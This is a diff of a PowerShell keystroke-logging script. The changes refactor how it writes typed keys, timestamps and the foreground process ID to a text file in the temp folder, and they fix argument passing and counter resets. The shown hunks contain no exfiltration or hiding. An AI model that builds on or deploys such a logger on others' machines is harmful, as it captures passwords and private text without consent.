@@ -29,9 +29,9 @@ function get-activewin()
   $hwnd = [Win32.Utils]::GetForegroundWindow()
   $null = [Win32.Utils]::GetWindowThreadProcessId($hwnd, [ref] $myPid)
   $activewin = Get-Process| Where-Object ID -eq $myPid | Select-Object *
+  # return
   $activewin
 }
-
 
 function output-line($logPath, $ary_str, $cnt){
   $activewin = get-activewin
@@ -42,9 +42,13 @@ function output-line($logPath, $ary_str, $cnt){
   $null = $arylst.Add($ary_str)
   $ary = $arylst.ToArray()
   $line = [String]::Join("`t", $ary)
-  [System.IO.File]::AppendAllText($logPath, $line + "`r`n", $C_Encode)
+  
+  Add-Content -Path $logPath -Value "$line`r`n" -Encoding $C_Encode
   if($C_debug_mode){
-    $logger.info.Invoke($line)
+    # $logger.info.Invoke("logPath=$logPath")
+    # $logger.info.Invoke("cnt=$cnt")
+    # $logger.info.Invoke("ary_str=$ary_str")
+    $logger.info.Invoke("line=$line")
   }
 }
 
@@ -56,7 +60,8 @@ function Log-Keystrokes($logPath="$env:temp\Keystrokes.txt")
     $null
   }else{
     $null = New-Item -Path $logPath -ItemType File
-    [System.IO.File]::AppendAllText($logPath, "datetime`tprocessid`tcount`tkeystrokes`r`n", $C_Encode)
+    $line = "datetime`tprocessid`tcount`tkeystrokes"
+    Add-content -Path $logPath  -Value "$line`r`n" -Encoding $C_Encode
   }
   # buf
   $arylst = New-Object System.Collections.ArrayList
@@ -110,8 +115,13 @@ function Log-Keystrokes($logPath="$env:temp\Keystrokes.txt")
       }
       $ary = $arylst.ToArray()
       $ary_str = [string]::Join(",",$ary)
-      output-line($logPath, $ary_str, $cnt)
-      $i = 0
+      # if($C_debug_mode){
+      #   $logger.info.Invoke("logPath=$logPath")
+      #   $logger.info.Invoke("cnt=$cnt")
+      #   $logger.info.Invoke("ary_str=$ary_str")
+      # }
+      output-line $logPath $ary_str $cnt
+      $cnt = 0
       $buf = ''
       $arylst.Clear()
     }
@@ -121,7 +131,8 @@ function Log-Keystrokes($logPath="$env:temp\Keystrokes.txt")
     $null = $arylst.Add($buf)
     $ary = $arylst.ToArray()
     $ary_str = [string]::Join(",",$ary)
-    output-line($logPath, $ary_str, $cnt)
+    $cnt = $buf.length + $ary.length - 1
+    output-line $logPath $ary_str $cnt
   }
 }
 
@@ -137,4 +148,4 @@ $config = "./$project_name.config.ps1"
 $logger = Get-Logger
 $logger.info.Invoke("get config from $config")
 
-Log-Keystrokes($C_output_path)
+Log-Keystrokes $C_output_path
